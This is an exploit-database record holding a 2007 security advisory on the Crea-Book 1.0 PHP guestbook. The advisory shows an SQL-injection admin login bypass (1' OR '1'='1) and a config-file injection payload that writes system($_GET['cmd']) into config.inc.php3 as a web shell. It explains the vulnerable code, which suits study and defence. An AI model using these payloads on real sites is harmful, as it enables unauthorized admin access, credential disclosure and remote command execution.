{
  "id": "3701",
  "title": "Crea-Book 1.0 - Admin Access Bypass / Database Disclosure / Code Execution",
  "cve": "CVE-2007-2001",
  "vuln_type": "sqli",
  "code": "\t/=======================================\\\r\n\t| Advisory :: Crea-Book <= 1.0\t\t|\r\n\t+=======================================+---------------------------------------------------------------\\\r\n\t|\t\t\t\t\t\t\t\t\t\t\t\t\t|\r\n\t|      Download link : http://www.comscripts.com/scripts/php.creabook.1359.html\t\t\t\t|\r\n\t|               Type : Guestbook\t\t\t\t\t\t\t\t\t|\r\n\t|        Vuln. found : Admin Access Bypass, DB information Disclosure & Code Execution Weakness\t|\r\n\t| \t  Conditions : magic_quotes_gpc = Off\t\t\t\t\t\t\t\t|\r\n\t|\t  Risk level : High\t\t\t\t\t\t\t\t\t\t|\r\n\t|\t\t\t\t\t\t\t\t\t\t\t\t\t|\r\n\t+-------------------------------------------------------------------------------------------------------+\r\n\t|\t\t\t\t\t\t\t\t\t\t\t\t\t|\r\n\t| Program audited by : Xst3nZ <xst3nz@gmail.com> [fr/en]\t\t\t\t\t\t|\r\n\t|               Date : 2007-04-10\t\t\t\t\t\t\t\t\t|\r\n\t|\t Last update : 2007-04-10\t\t\t\t\t\t\t\t\t|\r\n\t|\t\t\t\t\t\t\t\t\t\t\t\t\t|\r\n\t+-------------------------------------------------------------------------------------------------------+\r\n\t| \t     Summary : \t0] Description\t\t\t\t\t\t\t\t\t|\r\n\t|\t\t\t1] Vuln#1 : Administrative Access Bypass using basic SQL injection\t\t|\r\n\t|\t\t\t2] Vuln#2 : PHP Code Execution Weakness\t\t\t\t\t\t|\r\n\t|\t\t\t3] Links & Documentation\t\t\t\t\t\t\t|\r\n\t\\-------------------------------------------------------------------------------------------------------/\r\n\r\n\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n <0> DESCRIPTION\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n  This script is old but analysing it is a good way to understand some classic security holes in web\r\napplications. It's just a good and fast training.\r\nLet's g0 ...\r\n\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n <1> VULNERABILITY #1 : ADMINISTRATIVE ACCESS BYPASS USING BASIC SQL INJECTION\r\n\r\n  { Concerned file : admin/admin.php }\r\n  { Cond: magic_quotes_gpc=Off }\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n  If we open the file 'admin/admin.php', we can see that the following code is executed after the submission of\r\nthe login authentification form :\r\n\r\n+--------8<--------\r\n| // [...] line 8\r\n| $sql=\"Select * from $table2 where pseudo='$pseudo' and passe='$passe'\";\r\n| // By the way, we can notice that the script works only if register_globals=On\r\n| $res=mysql_query($sql);\r\n| $nb=mysql_num_rows($res);\r\n| if ($nb>0)\r\n| {\r\n| \t// Login OK [...]\r\n| }\r\n| else\r\n| \theader(\"Location: index.php?erreur=2\");\r\n| // line 208 (EOF)\r\n+--------8<--------\r\n\r\nIn fact, the variables called $pseudo and $passe aren't sanitized and so, it is possible to bypass easily the\r\nauthentification by using a basic SQL injection (see [1]). Nevertheless, single quotes must be used in this injection.\r\nTherefore, the magic_quote_gpc parameter must be disabled (Off) in the php.ini configuration file.\r\n\r\n  +---->> Vuln. #1 Pro0f of Concept <<--------\r\n  |\r\n  | - Go to : http://www.victim.com/[install_directory]/admin/admin.php\r\n  | - Type the following string in the two fields :\r\n  |  \t| Pseudo (login) : evil\r\n  |\t| Mot de passe (password) : 1' OR '1'='1\r\n  | - If magic_quotes_gpc=Off, you are now logged as admin. So, you have access to the control panel.\r\n  | - Let's go to the section called 'Configurer le script' (configure the script). In this page, you can see\r\n  | all the different informations required to connect to the MySQL server (DataBase Information Disclosure)\r\n  |\r\n  +-------------------------------------------//\r\n\r\n\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n <2> VULNERABILITY #2 : PHP CODE EXECUTION WEAKNESS\r\n\r\n  { Concerned file : admin/configurer2.php }\r\n  { Cond: magic_quotes_gpc=Off, admin access OK }\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n  The file 'admin/configurer2.php', which is used when the configuration form is submitted, contains the following\r\ncode :\r\n\r\n+--------8<--------\r\n| // [...] line 95\r\n| $fichier = fopen(\"../config.inc.php3\",\"w+\") OR die (\"...\");;\r\n| fwrite($fichier, \"<?php\\n\") or die (\"...\");\r\n| fwrite($fichier, \"// Infos de connexion \u00c3  la base de donn\u00c3\u00a9es\\n\\n$\");\r\n| fwrite($fichier, \"bddserver = \\\"$bddserver\\\";\\n$\");\r\n| // [...]\r\n| fwrite($fichier, \"mess_fin = \\\"$mess_fin\\\";\\n\");\r\n| fwrite($fichier, \"?>\");\r\n| fclose($fichier);\r\n| // line 125\r\n+--------8<--------\r\n\r\nSo, all the information which are typed in the form are written in a PHP file called 'config.inc.php3' without\r\nany verification before. Consequently, a malicious person which have an admin access (easy with the vuln #1) can put\r\nwhat she wants in the file in question (only if magic_quotes_gpc=Off because double quotes are used). Let's \r\nsee an example in the next PoC :\r\n\r\n  +---->> Vuln. #2 Pro0f of Concept <<--------\r\n  |\r\n  | - Log in as admin on 'admin/admin.php' (see Vuln. #1 PoC).\r\n  | - Go to 'admin/configurer.php'.\r\n  | - Type the following string in one of the fields : value\"; [Malicious PHP code]; $nothing=\"\r\n  | Example with the fields 'Fond de la page' (background color) : #FFFFFF\"; system($_GET['cmd']); $nothing=\"\r\n  |         that gives : $fond = \"#FFFFFF\"; system($_GET['cmd']); $nothing=\"\";\r\n  |\r\n  +-------------------------------------------//\r\n\r\nNote : the file 'install/index.php' isn't deleted after the installation and it contains the same configuration\r\nform. But, database information (login, password, DB name, server name) are required to write data into the PHP file...\r\n\r\n\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n <3> LINKS & DOCUMENTATION\r\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\r\n\r\n [1] SQL injection Attacks by Example (good)\r\n\thttp://www.unixwiz.net/techtips/sql-injection.html\r\n\r\n\r\n// [EOF] Xst3nZ\r\n\r\n# milw0rm.com [2007-04-10]",
  "url": "https://www.exploit-db.com/exploits/3701"
}